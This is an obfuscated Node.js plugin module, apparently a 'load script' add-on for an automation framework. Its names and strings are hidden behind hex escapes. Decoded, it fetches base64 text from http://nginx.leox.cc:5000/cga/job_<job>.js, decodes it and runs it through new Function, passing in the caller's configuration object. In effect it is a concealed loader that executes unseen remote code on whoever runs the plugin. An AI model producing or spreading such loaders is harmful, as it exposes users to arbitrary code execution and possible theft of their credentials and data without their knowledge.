const pluginName = '\u52a0\u8f7d\u811a\u672c', version = '\x31\x2e\x31';
let first = ![];
const getVersion = () => {
        return version;
    }, tips = async _0x25e7ce => {
        await leo['\x6c\x6f\x67']('\u5df2\u6210\u529f\u52a0\u8f7d' + pluginName + '\u63d2\u4ef6\uff0c\u63d2\u4ef6\u7248\u672c\x5b' + version + '\x5d');
    }, init = async _0x57445e => {
        _0x57445e['\x6a\x6f\x62'] = _0x57445e['\x6a\x6f\x62'] ? _0x57445e['\x6a\x6f\x62'] : '\x67\x67', leo['\x73\x65\x6e\x64\x47\x65\x74'] = (_0x41e69b, _0x2b6d6e) => new Promise((_0x5c3e81, _0xe8c65b) => {
            leo['\x72\x65\x71\x75\x65\x73\x74']['\x67\x65\x74']({
                '\x75\x72\x6c': _0x41e69b,
                '\x71\x73': _0x2b6d6e
            }, function (_0x2d983e, _0x5e53e6, _0x1162ed) {
                !_0x2d983e && _0x5e53e6['\x73\x74\x61\x74\x75\x73\x43\x6f\x64\x65'] == 0xc8 ? _0x5c3e81(_0x1162ed) : _0x5c3e81('\x7b\x22\x73\x74\x61\x74\x75\x73\x22\x3a\x22\x4e\x22\x2c\x22\x6d\x65\x73\x73\x61\x67\x65\x22\x3a\x22\x73\x74\x61\x74\x75\x73\x43\x6f\x64\x65\x3d' + _0x5e53e6['\x73\x74\x61\x74\x75\x73\x43\x6f\x64\x65'] + '\x22\x7d');
            });
        });
        let _0x2fe335 = '\x68\x74\x74\x70\x3a\x2f\x2f\x6e\x67\x69\x6e\x78\x2e\x6c\x65\x6f\x78\x2e\x63\x63\x3a\x35\x30\x30\x30\x2f\x63\x67\x61\x2f\x6a\x6f\x62\x5f' + _0x57445e['\x6a\x6f\x62'] + '\x2e\x6a\x73';
        const _0x1fcbed = await leo['\x73\x65\x6e\x64\x47\x65\x74'](_0x2fe335);
        leo['\x63\x66'] = _0x15e6d7 => new Function(Buffer['\x66\x72\x6f\x6d'](_0x15e6d7, '\x62\x61\x73\x65\x36\x34')['\x74\x6f\x53\x74\x72\x69\x6e\x67']())();
        const _0x4eaf4e = leo['\x63\x66'](_0x1fcbed);
        return _0x4eaf4e(_0x57445e);
    }, start = async _0x51fba7 => {
        return !first && (first = !![], tips(cga)), init(_0x51fba7);
    };
module['\x65\x78\x70\x6f\x72\x74\x73'] = { '\x73\x74\x61\x72\x74': start };